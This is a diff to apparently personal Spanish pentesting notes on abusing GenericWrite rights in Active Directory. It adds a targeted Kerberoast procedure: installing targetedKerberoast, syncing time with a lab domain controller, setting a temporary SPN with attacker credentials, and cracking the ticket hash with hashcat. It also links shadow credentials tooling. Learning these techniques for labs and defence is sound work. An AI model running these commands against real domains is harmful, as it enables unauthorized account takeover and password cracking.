@@ -2,7 +2,48 @@
 
 Tags: #AD #ACL #Linux #Impacket #ShadowAttack #Pywhisker #Gettgtpkinit 
 
-## GenericWrite sobre Usuario - Forma 1 (Shadow Attack)
+## GenericWrite sobre un usuario - Forma 1 (Kerberosteable) 
+
+Ataques:
+	1. Targered Kerberoast --> Colocar un SPN 
+	2. Shadow Credential Attack --> Modificar msDS-KeyCredentialLink
+
+* [TargetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
+
+```bash 
+# Instalación
+❯ git clone https://github.com/ShutdownRepo/targetedKerberoast.git
+❯ cd targetedKerberoast
+❯ pip3 install -r requirements.txt --break-system-packages
+```
+
+```bash 
+Paso 1:
+# Sincronizar el reloj con el DC
+❯ sudo timedatectl set-ntp false
+❯ sudo ntpdate 10.129.46.68
+# o
+❯ sudo chronyd -q 'server 10.129.46.68 iburst'
+```
+
+```powershell 
+Paso 2:
+❯ targetedKerberoast.py -u "ControlledAccount" -p "password" -d "domain" --dc-ip IP
+# Esto lo hace para todos los usuarios y al usuario que encuentre con el permiso de GenericWrite le escribe temporal sobre el atributo SPN para obtener el TGT. 
+
+	# u = Usuario atacante 
+	# p = Contraseña del usuario atacante 
+```
+
+```bash 
+Paso 3:
+# Crackear el hash 
+❯ hashcat -m 13100 --force -a 0 --rules /usr/share/hascat/rules/InsidePro-PasswordsPro.rule kerberoasting.tgt  /usr/share/wordlists/rockyou.txt   
+
+	# kerberoasting.tgs = Contiene el TGT del comando anterior 
+```
+
+## GenericWrite sobre Usuario - Forma 2 (Shadow Attack)
 
 * [PyWhisker](https://github.com/ShutdownRepo/pywhisker/tree/main/pywhisker)
 * [Shadow Credentials attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
@@ -79,7 +120,7 @@ Paso 3:
 	# Output: NT Hash (aad3b435b51404eeaad3b435b51404ee:88f6fb6111fcf...)
 ```
 
-## GenericWrite sobre usuario - Forma 2 (Shadow Credentials Attack) 
+## GenericWrite sobre un usuario - Forma 3 (Shadow Credentials Attack) 
 
 * [PyWhisker](https://github.com/ShutdownRepo/pywhisker/tree/main/pywhisker)
 * [Shadow Credentials attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
